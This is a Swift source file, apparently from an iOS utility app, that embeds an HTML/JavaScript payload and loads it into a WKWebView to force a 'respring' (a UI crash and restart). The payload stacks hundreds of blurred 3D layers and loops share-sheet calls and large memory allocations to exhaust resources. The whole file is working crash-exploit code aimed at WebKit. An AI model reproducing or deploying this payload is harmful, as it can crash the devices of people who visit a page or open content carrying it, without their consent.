//
//  respring.swift
//  controller
//

import Foundation
import SwiftUI
import UIKit
import WebKit

let respringdoc = """
<!DOCTYPE html>
<html>
    <body>
        <iframe id="frame" srcdoc="" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts"></iframe>
        <script>
            const frame = document.getElementById('frame');
            const script = `
                <html>
                <body>
                    <script>
                        const container = document.createElement('div');
                        container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                        document.body.appendChild(container);
                        for (let i = 0; i < 500; i++) {
                            let d = document.createElement('div');
                            d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
                            container.appendChild(d);
                        }
                        setInterval(() => {
                            navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
                            let x = new Uint8Array(1024 * 1024 * 10);
                            crypto.getRandomValues(x);
                        }, 0);
                    <\\/script>
                </body>
                </html>
            `;
            frame.srcdoc = script;
        </script>
    </body>
</html>
"""

func respring() {
    DispatchQueue.main.async {
        guard let window = UIApplication.shared.connectedScenes
            .compactMap({ $0 as? UIWindowScene })
            .flatMap({ $0.windows })
            .first(where: { $0.isKeyWindow }) else { return }
        let wv = WKWebView(frame: window.bounds)
        wv.loadHTMLString(respringdoc, baseURL: nil)
        window.addSubview(wv)
    }
}

struct respringview: UIViewRepresentable {
    func makeUIView(context: Context) -> WKWebView {
        let ww = WKWebView()
        return ww
    }
    func updateUIView(_ ww: WKWebView, context: Context) {
        ww.loadHTMLString(respringdoc, baseURL: nil)
    }
}
